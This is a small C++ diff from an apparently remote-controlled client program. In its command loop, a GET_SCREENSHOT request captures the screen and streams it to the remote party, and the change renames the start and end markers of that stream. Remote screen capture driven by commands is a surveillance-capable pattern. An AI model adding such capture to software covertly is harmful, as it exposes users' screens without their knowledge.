@@ -292,11 +292,11 @@ int main() {
                 if (command == "GET_SCREENSHOT") {
                     string screen_path = wstrToStr(screenshot(wstring(screenshot_dir.begin(), screenshot_dir.end())));
                     auto data = bmpToVector(screen_path);
-                    client->sendMessage("SCREENSHOT START");
+                    client->sendMessage("SCREENSHOT_START");
                     for (auto line : data) {
                         client->sendMessage(line);
                     }
-                    client->sendMessage("SCREENSHOT END");
+                    client->sendMessage("SCREENSHOT_END");
 
                 }
                 else if (command == "GET_STATE") {
